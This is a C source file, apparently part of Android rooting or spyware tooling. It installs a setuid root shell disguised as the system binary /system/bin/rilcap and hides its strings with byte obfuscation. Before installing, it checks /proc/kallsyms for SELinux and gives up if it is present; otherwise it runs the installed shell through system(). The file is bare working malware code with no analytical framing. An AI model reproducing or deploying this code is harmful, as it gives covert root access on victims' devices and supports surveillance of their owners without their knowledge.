#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "log.h"
#include "deobfuscate.h"

static unsigned char proc_kallsyms[] = "\xa2\x97\x3b\xb3\xfe\xf0\xf3\xcf\xb3\xf7\xcd\xf2\xf2\xff\xe5\xf1\xff"; // "/proc/kallsyms"
static unsigned char selinux[] = "\xea\x6b\x89\x6f\x91\x9a\x85\x84\x61\x96\x4b"; // "selinux_"
static unsigned char ril[] = "\x35\x63\x44\x1e\xca\xcc\xca\xc7\xd0\xd8\x1e\xd9\xdc\xdd\x1e\xc9\xdc\xdf\xda\xd4\xcb"; // "/system/bin/rilcap"
static unsigned char air[] = "\x9b\xc5\x5d\x7a\x72\x6b"; // "air"
static unsigned char rt[] = "\xd5\x09\xd9\xf0\xa6\xf7\xb9\xa3"; // "%s rt"


int check_selinux(void) {
  FILE *fp;
  char function[BUFSIZ];
  char symbol;
  void *address;
  int ret;

  fp = fopen(deobfuscate(proc_kallsyms), "r");
  if (!fp) {
    return 0;
  }

  while(!feof(fp)) {
    ret = fscanf(fp, "%p %c %s", &address, &symbol, function);
    if (ret != 3) {
      break;
    }

    if (strstr(function, deobfuscate(selinux))) {
      LOGD("SELinux detected, old suidext not supported");
      fclose(fp);
      return 1;
    }
  }
  fclose(fp);

  return 0;
}


int check_setuid(char *shell) {
  struct stat st;
  char shell_cmd[128];

  LOGD("Installing shell");
  
  snprintf(shell_cmd, sizeof(shell_cmd), deobfuscate(rt), shell);
  system(shell_cmd);

  if(stat(deobfuscate(ril), &st) < 0) {
    LOGD("Suidext failed");
    return 0;
  }

  memset(shell_cmd, 0, sizeof(shell_cmd));
  snprintf(shell_cmd, sizeof(shell_cmd), "%s %s", deobfuscate(ril), deobfuscate(air));

  LOGD("Exec %s", shell_cmd);

  return system(shell_cmd);
}


int install_old_shell(char *old_shell_path) {
  int ret = 0;

  if(check_selinux())
    return 0;

  ret = check_setuid(old_shell_path);
  
  if(ret) {
    LOGD("Old suidext supported");
    return 1;
  }
  else {
    LOGD("Old suidext not supported");
    return ret;
  }

  return ret;

}

